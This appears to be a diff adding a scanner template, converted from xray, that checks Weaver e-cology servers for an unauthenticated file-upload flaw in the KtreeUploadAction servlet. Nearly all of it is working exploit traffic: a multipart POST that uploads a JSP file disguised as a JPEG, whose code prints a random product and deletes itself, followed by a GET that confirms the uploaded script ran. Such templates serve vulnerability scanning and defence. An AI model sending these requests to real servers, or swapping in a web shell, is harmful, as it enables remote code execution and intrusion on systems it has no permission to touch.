@@ -1,0 +1,44 @@
+id: poc-yaml-weaver-e-cology-ktreeuploadaction-upload
+
+info:
+  name: poc-yaml-weaver-e-cology-ktreeuploadaction-upload
+  author: socat
+  severity: critical
+  tags: xray-converted,fileupload,ct-490587
+  reference:
+    - https://mp.weixin.qq.com/s/3ip7-U8BsWgq3N4SP5xd4w
+
+http:
+  - raw:
+      - |
+        POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="test"; filename="{{rand_base(8)}}.jsp"
+        Content-Type: image/jpeg
+        
+        <%out.print({{rand_int(1000, 9999)}} * {{rand_int(1000, 9999)}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SUCCESS"
+  - raw:
+      - |
+        GET /{{furl}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
